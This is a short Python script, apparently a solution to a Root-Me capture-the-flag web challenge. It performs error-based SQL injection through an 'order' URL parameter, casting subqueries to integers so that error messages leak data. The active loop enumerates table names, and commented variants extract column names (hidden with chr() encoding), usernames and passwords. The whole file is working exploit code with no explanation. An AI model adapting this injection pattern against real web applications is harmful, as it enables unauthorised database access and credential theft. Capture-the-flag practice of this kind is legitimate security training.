# ====================== MADE BY KHANGTICTOC ========================

import requests 

i = 0 
while(True):
    # Get table's name
    request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select table_name from information_schema.tables limit 1 offset " + str(i) + ") as int)")
    
    # Get column's name
    #request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select column_name from information_schema.columns where table_name=chr(109) || chr(51) || chr(109) || chr(98) || chr(114) || chr(51) || chr(53) || chr(116) || chr(52) || chr(98) || chr(108) || chr(51) limit 1 offset " + str(i) + ") as int)")
    
    # Get username
    # request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select us3rn4m3_c0l from m3mbr35t4bl3 limit 1 offset " + str(i) + ") as int)")
    
    # Get password
    # request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset " + str(i) + ") as int)")
    
    response = request.text
    content = response[response.find("invalid")::]
    print(content)
    i += 1




